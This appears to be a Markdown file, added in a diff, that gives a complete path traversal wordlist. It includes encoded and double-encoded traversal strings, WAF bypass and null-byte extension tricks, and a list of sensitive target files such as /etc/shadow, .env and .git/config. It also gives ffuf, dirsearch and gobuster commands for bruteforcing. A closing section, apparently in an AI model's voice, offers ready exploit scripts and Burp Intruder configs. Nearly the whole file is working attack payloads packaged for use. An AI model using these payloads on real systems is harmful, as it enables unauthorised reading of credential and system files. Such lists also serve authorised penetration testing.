@@ -1,0 +1,231 @@
+# ⚡ COMPLETE PATH TRAVERSAL WORDLIST
+
+---
+
+# 🧩 1. **Basic Path Traversal Payloads**
+```
+../
+..%2f
+..%2F
+..%5c
+..%5C
+..\
+..\/
+%2e%2e%2f
+%2e%2e/
+%2e%2e%5c
+%2e%2e\
+..%c0%af
+..%c1%9c
+..%c0%2f
+..%e0%80%af
+%252e%252e%252f
+```
+
+---
+
+# 🧩 2. **Double Traversal Patterns**
+(Repeat traversal multiple times)
+
+```
+../../
+..%2f..%2f
+..%5c..%5c
+....//
+....\\
+%2e%2e/%2e%2e/
+%2e%2e\%2e%2e\
+..%c0%af..%c0%af
+..%c1%9c..%c1%9c
+%252e%252e/%252e%252e/
+```
+
+---
+
+# 🧩 3. **Deep Traversal (to reach /etc/passwd or root files)**
+```
+../../../../../../etc/passwd
+..%2f..%2f..%2f..%2fetc/passwd
+..%5c..%5c..%5c..%5cwindows/win.ini
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+....//....//....//....//etc/passwd
+..%c0%af..%c0%af..%c0%afetc/passwd
+```
+
+---
+
+# 🧩 4. **Common Target Files**
+(Try to read these sensitive files!)
+
+```
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/issue
+/etc/profile
+/etc/group
+/proc/self/environ
+/.env
+/.git/config
+/.htaccess
+/.htpasswd
+/WEB-INF/web.xml
+/config.php
+/credentials.json
+/db.sql
+/.DS_Store
+/windows/win.ini
+/windows/system32/drivers/etc/hosts
+```
+
+---
+
+# 🧩 5. **Special WAF Bypass Tricks**
+✅ Mix separators, double URL encode, or use unusual payloads:
+
+```
+..;/etc/passwd
+..;/../etc/passwd
+..%00/etc/passwd
+..%0d/etc/passwd
+..%0a/etc/passwd
+..%09/etc/passwd
+..%ff/etc/passwd
+..%2e%2e%2f/etc/passwd
+..%c0%ae%c0%ae%c0%afetc/passwd
+..%ef%bc%8fetc%ef%bc%8fpasswd
+../%252e%252e/etc/passwd
+/%2e%2e/%2e%2e/etc/passwd
+/%252e%252e/%252e%252e/etc/passwd
+```
+
+---
+
+# 🧩 6. **Traversal With Null Bytes and Extension Bypass**
+✅ Useful when file extension checks are enforced (e.g., `.jpg` only uploads)
+
+```
+../../../../etc/passwd%00
+../../../../etc/passwd%00.jpg
+../../../../etc/passwd.
+../../../../etc/passwd/.jpg
+../../../../etc/passwd%00.png
+../../../../etc/passwd%00.html
+```
+
+---
+
+# 🧩 7. **Windows Specific Traversal**
+(especially for IIS servers)
+
+```
+..\\
+..%5c
+..%255c
+..%c0%af
+..%c1%9c
+..%2e%2e%5c
+..\..\..\windows\win.ini
+..\..\..\..\boot.ini
+c:\windows\win.ini
+c:\boot.ini
+c:/windows/win.ini
+```
+
+---
+
+# 🧩 8. **Mix Traversal Techniques**
+✅ Mix and match for different behaviors:
+
+```
+....//....//....//etc/passwd
+../////../////etc/passwd
+%2e%2e%5c%2e%2e%5cetc%5cpasswd
+..%2f..%5cetc%5cpasswd
+..%2e%2e%2f%2e%2e%2fetc/passwd
+```
+
+---
+
+# 🧩 9. **Special Path Trickery**
+- Using **UTF-8** Encodings
+- Using **double traversal inside query parameters**
+- Using **absolute paths disguised as relative**
+
+```
+/../../../etc/passwd
+/..;/..;/etc/passwd
+/foo/../../../etc/passwd
+foo=../../../../etc/passwd
+?file=../../../../etc/passwd
+?path=..%2f..%2f..%2f..%2fetc%2fpasswd
+?doc=..%5c..%5c..%5c..%5cwindows%5cwin.ini
+```
+
+---
+
+# 🧩 10. **Traversal Wordlist Ready for Bruteforce Tools**
+(Specially cleaned for `ffuf`, `dirsearch`, `gobuster` etc)
+
+```
+../
+../../
+../../../
+../../../../
+../../../../../../
+../../../../../../etc/passwd
+../../../../../../proc/self/environ
+../../../../../../.env
+../../../../../../.git/config
+../../../../../../config.php
+../../../../../../windows/win.ini
+../../../../../../boot.ini
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%5c..%5c..%5c..%5cetc%5cpasswd
+..%2e%2e%2f%2e%2e%2fetc/passwd
+..%c0%ae%c0%ae%c0%afetc%2fpasswd
+```
+
+---
+
+# 🛠️ Pro Tips for Path Traversal Testing
+✅ Always try:
+- Both `/` and `\`
+- URL Encoded `%2e`, `%2f`, `%5c`
+- Double URL encoding (`%252e`, `%252f`)
+- Mix traversal with expected file extensions (jpg, pdf)
+
+✅ Tools to automate:
+- `ffuf -w traversal.txt -u https://target/FUZZ`
+- `dirsearch -e php,html,txt -w traversal.txt -u https://target.com`
+- `gobuster dir -w traversal.txt -u https://target.com`
+
+---
+
+# 🔥 Bonus:
+If you want, I can also provide:
+- 📋 **Ready-to-import Path Traversal text file**
+- 🎯 **Traversal Exploit Scripts** (automatic payload testing for `/etc/passwd`, `.env`, `.git/config`)
+- 🧪 **Burp Intruder config** (attack using intruder with traversal patterns)
+
+---
+
+# 🎯 Final Mini Quick List
+```
+../
+..%2f
+..%5c
+../../
+..%2f..%2f
+..%5c..%5c
+....//
+....\\
+../../../../etc/passwd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%c0%af..%c0%af..%c0%afetc/passwd
+/etc/passwd
+/.env
+/.git/config
+/windows/win.ini
+```
